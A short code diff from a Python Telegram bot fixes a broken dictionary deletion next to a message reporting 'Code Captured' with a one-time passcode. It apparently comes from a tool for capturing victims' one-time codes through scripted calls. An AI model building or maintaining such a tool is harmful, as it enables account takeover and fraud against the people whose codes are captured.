@@ -1058,7 +1058,7 @@ def custom_prebuild_script_call(script_id,chatid):
             keyboard.add(item1,item2) 
             bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
             try:
-                 del accept_deny_handler[]
+                 del accept_deny_handler[chatid]
             except:
                  print("Error in deleting")
 
